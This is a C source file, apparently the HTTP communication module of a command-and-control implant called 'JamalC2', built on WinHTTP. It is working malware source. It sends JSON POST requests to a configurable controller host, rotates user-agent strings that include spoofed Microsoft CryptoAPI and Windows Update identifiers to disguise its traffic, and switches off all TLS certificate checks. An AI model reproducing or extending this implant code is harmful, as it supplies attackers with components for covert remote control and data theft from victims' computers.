/*
 * JamalC2 Implant - HTTP Client Implementation (WinHTTP)
 */

#include "http.h"
#include "config.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "winhttp.lib")

// Global session handle
static HINTERNET g_session = NULL;

// Random User-Agents
static const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like "
    "Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 "
    "Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like "
    "Gecko) Edge/120.0.0.0",
    "Microsoft-CryptoAPI/10.0",
    "Windows-Update-Agent/10.0.19041.1 Client-Protocol/2.0",
};
#define USER_AGENT_COUNT (sizeof(USER_AGENTS) / sizeof(USER_AGENTS[0]))

// Get random User-Agent
static const char *get_random_ua(void) {
  return USER_AGENTS[rand() % USER_AGENT_COUNT];
}

int http_init(void) {
  // Convert User-Agent to wide string
  wchar_t ua_wide[256];
  MultiByteToWideChar(CP_UTF8, 0, get_random_ua(), -1, ua_wide, 256);

  g_session = WinHttpOpen(ua_wide, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

  return g_session ? 0 : -1;
}

void http_cleanup(void) {
  if (g_session) {
    WinHttpCloseHandle(g_session);
    g_session = NULL;
  }
}

int http_post(const char *host, int port, int use_tls, const char *path,
              const char *body, size_t body_len, HttpResponse *response) {

  HINTERNET hConnect = NULL;
  HINTERNET hRequest = NULL;
  BOOL result = FALSE;
  DWORD bytes_read = 0;
  DWORD total_size = 0;
  char *buffer = NULL;
  int ret = -1;

  // Initialize response
  memset(response, 0, sizeof(HttpResponse));

  if (!g_session) {
    return -1;
  }

  // Convert host to wide string
  wchar_t host_wide[256];
  MultiByteToWideChar(CP_UTF8, 0, host, -1, host_wide, 256);

  // Connect
  hConnect = WinHttpConnect(g_session, host_wide, (INTERNET_PORT)port, 0);
  if (!hConnect) {
    DEBUG_PRINT("    [!] WinHttpConnect failed: %lu\n", GetLastError());
    goto cleanup;
  }

  // Convert path to wide string
  wchar_t path_wide[256];
  MultiByteToWideChar(CP_UTF8, 0, path, -1, path_wide, 256);

  // Open request
  DWORD flags = use_tls ? WINHTTP_FLAG_SECURE : 0;
  hRequest =
      WinHttpOpenRequest(hConnect, L"POST", path_wide, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
  if (!hRequest) {
    DEBUG_PRINT("    [!] WinHttpOpenRequest failed: %lu\n", GetLastError());
    goto cleanup;
  }

  // SSL options (ignore certificate errors for self-signed certs)
  if (use_tls) {
    DWORD ssl_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
                      SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &ssl_flags,
                     sizeof(ssl_flags));
  }

  // Add headers
  wchar_t headers[] = L"Content-Type: application/json\r\n"
                      L"Accept: application/json\r\n"
                      L"Cache-Control: no-cache\r\n";

  // Send request
  result = WinHttpSendRequest(hRequest, headers, -1, (LPVOID)body,
                              (DWORD)body_len, (DWORD)body_len, 0);
  if (!result) {
    DEBUG_PRINT("    [!] WinHttpSendRequest failed: %lu\n", GetLastError());
    goto cleanup;
  }

  // Receive response
  result = WinHttpReceiveResponse(hRequest, NULL);
  if (!result) {
    DEBUG_PRINT("    [!] WinHttpReceiveResponse failed: %lu\n", GetLastError());
    goto cleanup;
  }

  // Get status code
  DWORD status_code = 0;
  DWORD status_size = sizeof(status_code);
  WinHttpQueryHeaders(hRequest,
                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                      NULL, &status_code, &status_size, NULL);
  response->status_code = (int)status_code;

  // Read response body
  buffer = safe_malloc(4096);
  size_t buffer_size = 4096;
  size_t buffer_used = 0;

  do {
    DWORD available = 0;
    if (!WinHttpQueryDataAvailable(hRequest, &available))
      break;
    if (available == 0)
      break;

    // Grow buffer if needed
    while (buffer_used + available > buffer_size) {
      buffer_size *= 2;
      buffer = safe_realloc(buffer, buffer_size);
    }

    if (!WinHttpReadData(hRequest, buffer + buffer_used, available,
                         &bytes_read))
      break;
    buffer_used += bytes_read;

  } while (bytes_read > 0);

  // Null-terminate
  buffer = safe_realloc(buffer, buffer_used + 1);
  buffer[buffer_used] = '\0';

  response->body = buffer;
  response->body_len = buffer_used;
  buffer = NULL; // Transfer ownership

  ret = 0;

cleanup:
  if (buffer)
    free(buffer);
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);

  return ret;
}

void http_response_free(HttpResponse *response) {
  if (response->body) {
    free(response->body);
    response->body = NULL;
  }
  response->body_len = 0;
  response->status_code = 0;
}
